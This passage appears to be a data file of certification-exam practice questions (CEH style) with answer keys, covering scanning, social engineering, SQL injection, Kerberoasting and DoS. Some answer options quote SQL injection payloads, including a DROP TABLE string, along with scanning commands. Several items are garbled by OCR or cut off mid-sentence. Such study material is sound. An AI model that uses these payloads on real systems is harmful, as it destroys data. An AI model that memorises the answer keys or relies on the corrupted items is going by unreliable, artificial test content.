associated parameters such as the incremental transmit packet number and receive\npacket number are reset to their initial values. What is this attack called?", "a": ["Wardriving", "KRACK", "Chop chop attack", "Evil twin"], "c": [1], "e": null}, {"q": "After an audit, the auditors inform you that there is a critical finding that you must tackle immediately. You read the audit report, and the problem\nis the service running on port 389.\nWhich service is this and how can you tackle the problem?", "a": ["The service is LDAP, and you must change it to 636, which is LDAPS.", "The service is NTP, and you have to change it from UDP to TCP in order to encrypt it.", "The findings do not require immediate actions and are only suggestions.", "The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails."], "c": [0], "e": null}, {"q": "Mike, a security engineer, was recently hired by BigFox Ltd. The company recently experienced disastrous DoS attacks. The management had\ninstructed Mike to build defensive strategies for the company's IT infrastructure to thwart DoS/DDoS attacks. Mike deployed some\ncountermeasures to handle jamming and scrambling attacks.\nWhat is the countermeasure Mike applied to defend against jamming and scrambling attacks?", "a": ["Allow the usage of functions such as gets and strepy", "Implement cognitive radios in the physical layer", "Allow the transmission of all types of addressed packets at the ISP level", "Disable TCP SYN cookie protection"], "c": [1], "e": null}, {"q": "You are using a public Wi-Fi network inside a coffee shop. Before surfing the web, you use your VPN to prevent intruders from sniffing your traffic.\nIf you did not have a VPN, how would you identify whether someone is performing an ARP spoofing attack on your laptop?", "a": ["You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.", "You cannot identify such an attack and must use a VPN to protect your traffic.", "You should use netstat to check for any suspicious connections with another IP address within the LAN.", "You should check your ARP table and see if there is one IP address with two different MAC addresses."], "c": [3], "e": null}, {"q": "Lewis, a professional hacker, targeted the loT cameras and devices used by a target venture-capital firm. He used an information-gathering tool to\ncollect information about the loT devices connected to a network, open ports and services, and the attack surface area. Using this tool, he also\ngenerated statistical reports on broad usage patterns and trends. This tool helped Lewis continually monitor every reachable server and device on\nthe Internet, further allowing him to exploit these devices in the network.\nWhich of the following tools was employed by Lewis in the above scenario?", "a": ["Wapiti", "Lacework", "NeuVector", "Censys"], "c": [3], "e": null}, {"q": "Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining\nwhether the ports are online and any firewall rule sets are encountered.\nJohn decided to perform a TCP SYN ping scan on the target network.\nWhich of the following Nmap commands must John use to perform the TCP SYN ping scan?", "a": ["nmap -sn -PO \u003c target IP address >", "nmap -sn -PS \u003c target IP address >", "nmap -sn -PA \u003c target IP address >", "nmap -sn -PP \u003c target IP address >"], "c": [1], "e": null}, {"q": "Ricardo has discovered the username for an application in his target's environment. As he has a limited amount of time, he decides to attempt to\nuse a list of common passwords he found on the Internet. He compiles them into a list and then feeds that list as an argument into his password-\ncracking application. What type of attack is Ricardo performing?", "a": ["Dicti", "Known plaintext", "Brute force", "Password spraying"], "c": [0], "e": null}, {"q": "What would be the fastest way to perform content enumeration on a given web server by using the Gobuster tool?", "a": ["Performing content enumeration using a wordlist", "Performing content enumeration using the bruteforce mode and 10 threads", "Skipping SSL certificate verification", "Performing content enumeration using the bruteforce mode and random file extensions"], "c": [0], "e": null}, {"q": "When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the\nadministrator's Computer to update the router configuration.\nWhat type of an alert is this?", "a": ["True negative", "False negative", "True positive", "False positive"], "c": [3], "e": null}, {"q": "Garry is a network administrator in an organization. He uses SNMP to manage networked devices from a remote location. To manage nodes in the\nnetwork, he uses MIB, which contains formal descriptions of all network objects managed by SNMP. He accesses the contents of MIB by using a\nweb browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. He is currently retrieving\ninformation from an MIB that contains object types for workstations and server services.\nWhich of the following types of MIB is accessed by Garry in the above scenario?", "a": ["DHCP.MIB", "LNMMIIB", "MIB_II.MIB", "WINS.MIB"], "c": [1], "e": null}, {"q": "Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited\nplaces. Realizing this, James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation\nby using an automated tool, and gathers information to perform other sophisticated attacks.\nWhat is the tool employed by James in the above scenario?", "a": ["VisualRoute", "HULK", "ophcrack", "Hootsuite"], "c": [0], "e": null}, {"q": "Alice needs to send a confidential document to her coworker, Bryan. Their company has public key infrastructure set up. Therefore, Alice both\nencrypts the message and digitally signs it. Alice uses  to confirm the\ndigital signature.", "a": ["Bryan's private key; Alice's public key", "Bryan's public key; Bryan's public key", "Alice's public key; Alice's public key", "Bryan's public key; Alice's public key"], "c": [3], "e": null}, {"q": "What is the file that determines the basic configuration (specifically activities, services, broadcast receivers, etc.) in an Android application?", "a": ["AndroidManifest.xml", "classes.dex", "APK.info", "resources.asrc"], "c": [0], "e": null}, {"q": "Mason, a professional hacker, targets an organization and spreads Emotet malware through malicious script. After infecting the victim's device,\nMason further used Emotet to spread the infection across local networks and beyond to compromise as many machines as possible. In this\nprocess, he used a tool, which is a self-extracting RAR file, to retrieve information related to network resources such as writable share drives.\nWhat is the tool employed by Mason in the above scenario?", "a": ["Credential enumerator", "WebBrowserPassView", "Outlook scraper", "NetPass.exe"], "c": [0], "e": null}, {"q": "Which of the following Bluetooth hacking techniques refers to the theft of information from a wireless device through Bluetooth?", "a": ["Bluebugging", "Bluejacking", "Bluesmacking", "Bluesnarfing"], "c": [3], "e": null}, {"q": "While browsing his Facebook feed, Matt sees a picture one of his friends posted with the caption, \"Learn more about your friends!\", as well as a\nnumber of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is\nlegitimate, Matt responds to the questions on the post. A few days later, Matt's bank account has been accessed, and the password has been\nchanged.\nWhat most likely happened?", "a": ["Matt inadvertently provided his password when responding to the post.", "Matt's bank account login information was brute forced.", "Matt's computer was infected with a keylogger.", "Matt inadvertently provided the answers to his security questions when responding to the post."], "c": [3], "e": null}, {"q": "Attacker Simon targeted the communication network of an organization and disabled the security controls of NetNTLMv1 by modifying the values\nof LMCompatibilityLevel, NTLMMinClientSec, and RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the\nactive processes to masquerade as a legitimate user to launch further attacks.\nWhat is the type of attack performed by Simon?", "a": ["Dictionary attack", "Internal monologue attack", "Combinator attack", "Rainbow table attack"], "c": [1], "e": null}, {"q": "Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve's profile picture and\nthe description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days, Steve started\nasking about her company details and eventually gathered all the essential information regarding her company.\nWhat is the social engineering technique Steve employed in the above scenario?", "a": ["Diversion theft", "Baiting", "Piggybacking", "Honey trap"], "c": [3], "e": null}, {"q": "Hackers often raise the trust level of a phishing message by modeling the email to look similar to the internal email used by the target company.\nThis includes using logos, formatting, and names of the target company. The phishing message will often use the name of the company CEO,\nPresident, or Managers. The time a hacker spends performing research to locate this information about a company is known as?", "a": ["Reconnaissance", "Exploration", "Enumeration", "Investigation"], "c": [0], "e": null}, {"q": "Attacker Lauren has gained the credentials of an organization's internal server system, and she was often logging in during irregular times to\nmonitor the network activities. The organization was skeptical about the login times and appointed security professional Robert to determine the\nissue. Robert analyzed the compromised device to find incident details such as the type of attack, its severity, target, impact, method of\npropagation, and vulnerabilities exploited. What is the incident handling and response (IH&R) phase, in which Robert has determined these\nissues?", "a": ["Preparation", "Eradication", "Incident triage", "Incident recording and assignment"], "c": [2], "e": null}, {"q": "At what stage of the cyber kill chain theory model does data exfiltration occur?", "a": ["Actions on objectives", "Weaponization", "Installation", "Command and control"], "c": [0], "e": null}, {"q": "Johnson, an attacker, performed online research for the contact details of reputed cybersecurity firms. He found the contact number of\nsibertech.org and dialed the number, claiming himself to represent a technical support team from a vendor. He warned that a specific server is\nabout to be compromised and requested sibertech.org to follow the provided instructions. Consequently, he prompted the victim to execute\nunusual commands and install malicious files, which were then used to collect and pass critical information to Johnson's machine.\nWhat is the social engineering technique Steve employed in the above scenario?", "a": ["Diversion theft", "Quid pro quo", "Phishing", "Elicitation"], "c": [1], "e": null}, {"q": "An organization decided to harden its security against web-application and web-server attacks. John, a security personnel in the organization,\nemployed a security scanner to automate web-application security testing and to guard the organization's web infrastructure against web-\napplication threats. Using that tool, he also wants to detect XSS, directory transversal problems, fault injection, SQL injection, attempts to execute\ncommands, and several other attacks.\nWhich of the following security scanners will help John perform the above task?", "a": ["AlienVault\u00ef\u00bf\u00bd OSSIMTM", "Syhunt Hybrid", "Saleae Logic Analyzer", "Cisco ASA"], "c": [1], "e": null}, {"q": "Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows systems?", "a": ["autoroute", "keylogrecorder", "getuid", "getsystem"], "c": [3], "e": null}, {"q": "Sam is a penetration tester hired by Inception Tech, a security organization. He was asked to perform port scanning on a target host in the\nnetwork. While performing the given task, Sam sends FIN/ACK probes and determines that an RST packet is sent in response by the target host,\nindicating that the port is closed.\nWhat is the port scanning technique used by Sam to discover open ports?", "a": ["Xmas scan", "ACK flag probe scan", "IDLE/IPID header scan", "TCP Maimon scan"], "c": [3], "e": null}, {"q": "An organization has automated the operation of critical infrastructure from a remote location. For this purpose, all the industrial control systems\nare connected to the Internet. To empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and\nservice disruption, the organization decided to install an OT security tool that further protects against security incidents such as cyber espionage,\nzero-day attacks, and malware.\nWhich of the following tools must the organization employ to protect its critical infrastructure?", "a": ["BalenaCloud", "Robotium", "IntentFuzzer", "Flowmon"], "c": [3], "e": null}, {"q": "Heather's company has decided to use a new customer relationship management tool. After performing the appropriate research, they decided to\npurchase a subscription to a cloud-hosted solution. The only administrative task that Heather will need to perform is the management of user\naccounts. The provider will take care of the hardware, operating system, and software administration including patching and monitoring.\nWhich of the following is this type of solution?", "a": ["PaaS", "laaS", "CaaS", "SaaS"], "c": [3], "e": null}, {"q": "Juliet, a security researcher in an organization, was tasked with checking for the authenticity of images to be used in the organization's\nmagazines. She used these images as a search query and tracked the original source and details of the images, which included photographs,\nprofile pictures, and memes.\nWhich of the following footprinting techniques did Rachel use to finish her task?", "a": ["Google advanced search", "Meta search engines", "Advanced image search", "Reverse image search"], "c": [3], "e": null}, {"q": "Mary, a penetration tester, has found password hashes in a client system she managed to breach. She needs to use these passwords to continue\nwith the test, but she does not have time to find the passwords that correspond to these hashes.\nWhich type of attack can she implement in order to continue?", "a": ["LLMNR/NBT-NS poisoning", "Internal monologue attack", "Pass the hash", "Pass the ticket"], "c": [2], "e": null}, {"q": "Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network to identify the active\nsystems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What\nis the type of vulnerability assessment that Morris performed on the target organization?", "a": ["External assessment", "Credentialed assessment", "Passive assessment", "Internal assessment"], "c": [2], "e": null}, {"q": "Which of the following protocols can be used to secure an LDAP service against anonymous queries?", "a": ["RADIUS", "NTLM", "WPA", "SSO"], "c": [1], "e": null}, {"q": "During the enumeration phase, Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The\nservice that he enumerated runs directly on TCP port 445.\nWhich of the following services is enumerated by Lawrence in this scenario?", "a": ["Network File System", "Server Message Block", "Remote procedure call", "Telnet"], "c": [1], "e": null}, {"q": "Jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However, Jane\nhas a long, complex password on her router. What attack has likely occurred?", "a": ["Wireless sniffing", "Wardriving", "Piggybacking", "Evil twin"], "c": [3], "e": null}, {"q": "Which file is a rich target to discover the structure of a website during web-server footprinting?", "a": ["Document root", "Robots[Mo.sttVxotetd)", "domain.txt", "index.html"], "c": [1], "e": null}, {"q": "John, a professional hacker, decided to use DNS to perform data exfiltration on a target network. In this process, he embedded malicious data into\nthe DNS protocol packets that even DNSSEC cannot detect. Using this technique, John successfully injected malware to bypassa firewall and\nmaintained communication with the victim machine and C&C server.\nWhat is the technique employed by John to bypass the firewall?", "a": ["DNSSEC zone walking", "DNS tunneling method", "DNS cache snooping", "DNS enumeration"], "c": [1], "e": null}, {"q": "You are a cybersecurity specialist at CloudTech Inc., a company providing cloud-based services. You are managing a project for a client who\nwants to migrate their sensitive data to a public cloud service. To comply with regulatory requirements, the client insists on maintaining full\ncontrol over the encryption keys even when the data is at rest on the cloud. Which of the following practices should you implement to meet this\nrequirement?", "a": ["Use the cloud service provider's default encryption and key management services.", "Rely on Secure Sockets Layer encryption for data at rest.", "Encrypt data client-side before uploading to the cloud and retain control of the encryption keys.", "Use the cloud service provider's encryption services but store keys on-premises."], "c": [2], "e": null}, {"q": "In an advanced persistent threat scenario, an adversary follows a detailed set of procedures in the cyber kill chain. During one such instance, the\nadversary has successfully gained access to a corporate network and now attempts to obfuscate malicious traffic within legitimate network\ntraffic. Which of the following actions would most likely be part of the adversary's current procedures?", "a": ["Initiating DNS tunneling to communicate with the command-and-control server.", "Conducting internal reconnaissance using PowerShell scripts.", "Establishing a command-and-control server to communicate with compromised systems.", "Employing data staging techniques to collect and aggregate sensitive data."], "c": [0], "e": null}, {"q": "As a part of an ethical hacking exercise, an attacker is probing a target network that is suspected to employ various honeypot systems for\nsecurity. The attacker needs to detect and bypass these honeypots without alerting the target. The attacker decides to utilize a suite of\ntechniques. Which of the following techniques would NOT assist in detecting a honeypot?", "a": ["Analyzing the MAC address to detect instances running on VMware", "Probing system services and observing the three-way handshake", "Implementing a brute force attack to verify system vulnerability", "Using honeypot detection tools like Send-Safe Honeypot Hunter"], "c": [2], "e": null}, {"q": "A skilled ethical hacker was assigned to perform a thorough OS discovery on a potential target. They decided to adopt an advanced fingerprinting\ntechnique and sent a TCP packet to an open TCP port with specific flags enabled. Upon receiving the reply, they noticed the flags were SYN and\nECN-Echo. Which test did the ethical hacker conduct and why was this specific approach adopted?", "a": ["Test 2: This test was chosen because a TCP packet with no flags enabled is known as a NULL packet and this would allow the hacker to", "Test 1: The test was conducted because SYN and ECN-Echo flags enabled to allow the hacker to probe the nature of the response and", "Test 6: The hacker selected this test because a TCP packet with the ACK flag enabled sent to a closed TCP port would yield more", "Test 3: The test was executed to observe the response of the target system when a packet with URC, PSH, SYN, and FIN flags was sent,"], "c": [1], "e": null}, {"q": "In an intricate web application architecture using an Oracle database, you, as a security analyst, have identified a potential SQL Injection attack\nsurface. The database consists of 'x' tables, each with 'y' columns. Each table contains 'z' records. An attacker, well-versed in SQLi techniques,\ncrafts 'u' SQL payloads, each attempting to extract maximum data from the database. The payloads include 'UNION SELECT' statements and\n`DBMS_XSLPROCESSOR.READ2CLOB' to read sensitive files. The attacker aims to maximize the total data extracted 'E=xyz*u'. Assuming 'x=4',\n`y=2', and varying 'z' and 'u', which situation is likely to result in the highest extracted data volume?", "a": ["z=500, u=3: The attacker creates 3 SQL payloads and targets tables with 500 records each, exploiting all columns and tables.", "z=550, u=2: Here, the attacker formulates 2 SQL payloads and directs them towards tables containing 550 records, impacting all columns", "z=400, u=4: The attacker constructs 4 SQL payloads, each focusing on tables with 400 records, influencing all columns of all tables.", "z=600, u=2: The attacker devises 2 SQL payloads, each aimed at tables holding 600 records, affecting all columns across all tables."], "c": [2], "e": null}, {"q": "A large enterprise has been experiencing sporadic system crashes and instability, resulting in limited access to its web services. The security\nteam suspects it could be a result of a Denial of Service (DoS) attack. A significant increase in traffic was noticed in the network logs, with\npatterns suggesting packet sizes exceeding the prescribed size limit. Which among the following DoS attack techniques best describes this\nscenario?", "a": ["Ping of Death attack", "Smurf attack", "UDP flood attack", "Pulse wave attack"], "c": [0], "e": null}, {"q": "Your company has been receiving regular alerts from its IDS about potential intrusions. On further investigation, you notice that these alerts have\nbeen false positives triggered by certain goodware files. In response, you are planning to enhance the IDS with YARA rules, reducing these false\npositives while improving the detection of real threats. Based on the scenario and the principles of YARA and IDS, which of the following\nstrategies would best serve your purpose?", "a": ["Creating YARA rules to examine only the private database for intrusions", "Incorporating YARA rules to detect patterns in all files regardless of their nature", "Implementing YARA rules that focus solely on known malware signatures", "Writing YARA rules specifically to identify the goodware files triggering false positives"], "c": [3], "e": null}, {"q": "Jake, a network security specialist, is trying to prevent network-level session hijacking attacks in his company. While studying different types of\nsuch attacks, he learns about a technique where an attacker inserts their machine into the communication between a client and a server, making it\nseem like the packets are flowing through the original path. This technique is primarily used to reroute the packets. Which of the following types\nof network-level session hijacking attacks is Jake studying?", "a": ["TCP/IP Hijacking", "RST Hijacking", "Man-in-the-middle Attack Using Forged ICMP and ARP Spoofing", "UDP Hijacking"], "c": [2], "e": null}, {"q": "Given the complexities of an organization's network infrastructure, a threat actor has exploited an unidentified vulnerability, leading to a major\ndata breach. As a Certified Ethical Hacker (CEH). you are tasked with enhancing the organization's security stance. To ensure a comprehensive\nsecurity defense, you recommend a certain security strategy. Which of the following best represents the strategy you would likely suggest and\nwhy?", "a": ["Adopt a Continual/Adaptive Security Strategy involving ongoing prediction, prevention, detection, and response actions to ensure", "Establish a Defense-in-Depth strategy, incorporating multiple layers of security measures to increase the complexity and decrease the", "Develop an in-depth Risk Management process, involving identification, assessment, treatment, tracking, and review of risks to control the", "Implement an Information Assurance policy focusing on ensuring the integrity, availability, confidentiality, and authenticity of"], "c": [1], "e": null}, {"q": "As a cybersecurity professional, you are responsible for securing a high-traffic web application that uses MySQL as its backend database.\nRecently, there has been a surge of unauthorized login attempts, and you suspect that a seasoned black-hat hacker is behind them. This hacker\nhas shown proficiency in SQL Injection and appears to be using the 'UNION' SQL keyword to trick the login process into returning additional data.\nHowever, your application's security measures include filtering special characters in user inputs, a method usually effective against such attacks.\nIn this challenging environment, if the hacker still intends to exploit this SQL Injection vulnerability, which strategy is he most likely to employ?", "a": ["The hacker switches tactics and resorts to a `time-based blind' SQL Injection attack, which would force the application to delay its", "The hacker alters his approach and injects a DROP TABLE' statement, a move that could potentially lead to the loss of vital data stored in", "The hacker tries to manipulate the 'UNION' keyword in such a way that it triggers a database error, potentially revealing valuable information", "The hacker attempts to bypass the special character filter by encoding his malicious input, which could potentially enable him to"], "c": [3], "e": null}, {"q": "You're the security manager for a tech company that uses a database to store sensitive customer data. You have implemented countermeasures\nagainst SQL injection attacks. Recently, you noticed some suspicious activities and suspect an attacker is using SQL injection techniques. The\nattacker is believed to use different forms of payloads in his SQL queries. In the case of a successful SQL injection attack, which ofthe following\npayloads would have the most significant impact?", "a": ["' OR username LIKE '%': This payload uses the LIKE operator to search for a specific pattern in a column", "UNION SELECT NULL, NULL, NULL -- : This payload manipulates the UNION SQL operator, enabling the attacker to retrieve data from", "'OR'1'='l: This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data", "' OR `a'='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clause with a destructive action, causing data"], "c": [3], "e": null}, {"q": "A malicious user has acquired a Ticket Granting Service from the domain controller using a valid user's Ticket Granting Ticket in a Kerberoasting\nattack. He exhorted the TGS tickets from memory for offline cracking. But the attacker was stopped before he could complete his attack. The\nsystem administrator needs to investigate and remediate the potential breach. What should be the immediate step the system administrator\ntakes?", "a": ["Invalidate the TGS the attacker acquired", "Delete the compromised user's account", "Change the NTLM password hash used to encrypt the ST", "Perform a system reboot to clear the memory"], "c": [2], "e": null}, {"q": "You are a cybersecurity consultant for a healthcare organization that utilizes Internet of Medical Things (loMT) devices, such as connected insulin\npumps and heart rate monitors, to provide improved patientcare. Recently, the organization has been targeted by ransomware attacks. While the IT\ninfrastructure was unaffected due to robust security measures, they are worried that the loMT devices could be potential entry points for future\nattacks. What would be your main recommendation to protect these devices from such threats?", "a": ["Disable all wireless connectivity on loMT devices.", "Use network segmentation to isolate loMT devices from the main network.", "Implement multi-factor authentication for all loMT devices.", "Regularly change the IP addresses of all loMT devices."], "c": [1], "e": null}, {"q": "You are a cybersecurity consultant for a global organization. The organization has adopted a Bring Your Own Device (BYOD)policy, but they have\nrecently experienced a phishing incident where an employee's device was compromised. In the investigation, you discovered that the phishing\nattack occurred through a third-party email app that the employee had installed. Given the need to balance security and user autonomy under the\nBYOD policy, how should the organization mitigate the risk of such incidents? Moreover, consider a measure that would prevent similar attacks\nwithout overly restricting the use of personal devices.", "a": ["Provide employees with corporate-owned devices for work-related tasks.", "Implement a mobile device management solution that restricts the installation of non-approved applications.", "Conduct regular cybersecurity awareness training, focusing on phishing attacks.", "Require all employee devices to use a company-provided VPN for internet access."], "c": [2], "e": null}, {"q": "XYZ company recently discovered a potential vulnerability on their network, originating from misconfigurations. It was found that some of their\nhost servers had enabled debugging functions and unknown users were granted administrative permissions. As a Certified Ethical Hacker, what\nwould be the most potent risk associated with this misconfiguration?", "a": ["Weak encryption might be allowing man-in-the-middle attacks, leading to data tampering", "Unauthorized users may perform privilege escalation using unnecessarily created accounts", "An attacker may be able to inject a malicious DLL into the current running process", "An attacker may carry out a Denial-of-Service assault draining the resources of the server in the process"], "c": [1], "e": null}, {"q": "An organization suspects a persistent threat from a cybercriminal. They hire an ethical hacker, John, to evaluate their system security. John\nidentifies several vulnerabilities and advises the organization on preventive measures. However, the organization has limited resources and opts\nto fix only the most severe vulnerability. Subsequently, a data breach occurs exploiting a different vulnerability. Which of the following statements\nbest describes this scenario?", "a": ["The organization is at fault because it did not fix all identified vulnerabilities.", "Both the organization and John share responsibility because they did not adequately manage the vulnerabilities.", "John is at fault because he did not emphasize the necessity of patching all vulnerabilities.", "The organization is not at fault because they used their resources as per their understanding."], "c": [0], "e": null}, {"q": "An ethical hacker is attempting to crack NTLM hashed passwords from a Windows SAM file using a rainbow table attack. He has dumped the on-\ndisk contents of the SAM file successfully and noticed that all LM hashes are blank. Given this scenario, which of the following would be the most\nlikely reason for the blank LM hashes?", "a": ["The SAM file has been encrypted using the SYSKEY function.", "The Windows system is using the Kerberos authentication protocol as the default method.", "The passwords exceeded 14 characters in length and therefore, the LM hashes were set to a \"dummy\" value.", "The Windows system is Vista or a later version, where LM hashes are disabled by default."], "c": [3], "e": null}, {"q": "A Certified Ethical Hacker (CEH) is given the task to perform an LDAP enumeration on a target system. The system is secured and accepts\nconnections only on secure LDAP. The CEH uses Python for the enumeration process. After successfully installing LDAP and establishing a\nconnection with the target, he attempts to fetch details like the domain name and naming context but is unable to receive the expected response.\nConsidering the circumstances, which of the following is the most plausible reason for this situation?", "a": ["The system failed to establish a connection due to an incorrect port number.", "The enumeration process was blocked by the target system's intrusion detection system.", "The Python version installed on the CEH's machine is incompatible with the Idap3 library.", "The secure LDAP connection was not properly initialized due to a lack of 'use_ssl = True' in the server object creation."], "c": [3], "e": null}, {"q": "You are a cybersecurity consultant for a major airport that offers free Wi-Fi to travelers. The management is concerned about the possibility of\n\"Evil Twin\" attacks, where a malicious actor sets up a rogue access point that mimics the legitimate one. They are looking for a solution that\nwould not significantly impact the user experience or require travelers to install additional software. What is the most effective security measure\nyou could recommend that fits these constraints, considering the airport's unique operational environment?", "a": ["Implement WPA3 encryption for the airport's Wi-Fi network", "Use MAC address filtering on the airport's Wi-Fi network", "Display a captive portal page that warns users about the possibility of Evil Twin attacks", "Regularly change the SSID of the airport's Wi-Fi network"], "c": [0], "e": null}, {"q": "As a Certified Ethical Hacker, you are conducting a footprinting and reconnaissance operation against a target organization. You discover a range\nof IP addresses associated with the target using the SecurityTrails tool. Now, you need to perform a reverse DNS lookup on these IP addresses to\nfind the associated domain names, as well as determine the nameservers and mail exchange (MX) records. Which of the following DNSRecon\ncommands would be most effective for this purpose?", "a": ["dnsrecon -r 162.241.216.0/24 -n nsl.example.com -t std", "dnsrecon -t 162.241.216.0/24 -d example.com -t brt", "dnsrecon -t 192.168.1.0/24 -n nsl.example.com -t axfr", "dnsrecon -r 10.0.0.0/24 -n nsl.example.com -t zonewalk"], "c": [0], "e": null}, {"q": "You are an ethical hacker tasked with conducting an enumeration of a company's network. Given a Windows Answered Marked for Review 37.6%\nsystem with NetBIOS enabled, port 139 open, and file and printer sharing active, you are about to run some nbtstat commands to enumerate\nNetBIOS names. The company uses IPv6 for its network. Which of the following actions should you take next?", "a": ["Use nbtstat -a followed by the IPv6 address of the target machine", "Use nbtstat -c to get the contents of the NetBIOS name cache", "Utilize Nmap Scripting Engine for NetBIOS enumeration", "Switch to an enumeration tool that supports IPv6"], "c": [3], "e": null}, {"q": "During a red team assessment, a CEH is given a task to perform network scanning on the target network without revealing its IP address. They are\nalso required to find an open port and the services available on the target machine. What scanning technique should they employ, and which\ncommand in Zenmap should they use?", "a": ["Use the ACK flag probe scanning technique with the command \"-sA\"", "Use the IDLE/IPID header scan technique with the command \"-sI\"", "Use SCTP INIT Scan with the command \"-sY\"", "Use UDP Raw ICMP Port Unreachable Scanning with the command \"-sU\""], "c": [1], "e": null}, {"q": "A large corporation is planning to implement preventive measures to counter a broad range of social engineering techniques. The organization\nhas implemented a signature-based IDS, intrusion detection system, to detect known attack payloads and network flow analysis to monitor data\nentering and leaving the network. The organization is deliberating on the next step. Considering the information provided about various social\nengineering techniques, what should be the organization's next course of action?", "a": ["Set up a honeypot to attract potential attackers into a controlled environment for analysis", "Deploy more security personnel to physically monitor key points of access", "Organize regular employee awareness training regarding social engineering techniques and preventive meas", "Implement endpoint detection and response solution to oversee endpoint activities"], "c": [2], "e": null}, {"q": "An audacious attacker is targeting a web server you oversee. He intends to perform a Slow HTTP POST attack, by manipulating 'a' HTTP\nconnection. Each connection sends a byte of data every 'b' second, effectively holding up the connections for an extended period. Your server is\ndesigned to manage 'm' connections per second, but any connections exceeding this number tend to overwhelm the system. Given 'a=100' and\nvariable 'm', along with the attacker's intention of maximizing the attack duration 'D=a*b', consider the following scenarios. Which is most likely to\nresult in the longest duration of server unavailability?", "a": ["m=90, b=15: The server can manage 90 connections per second, but the attacker's 100 connections exceed this, and with each connection", "m=105, b=12: The server can manage 105 connections per second, more than
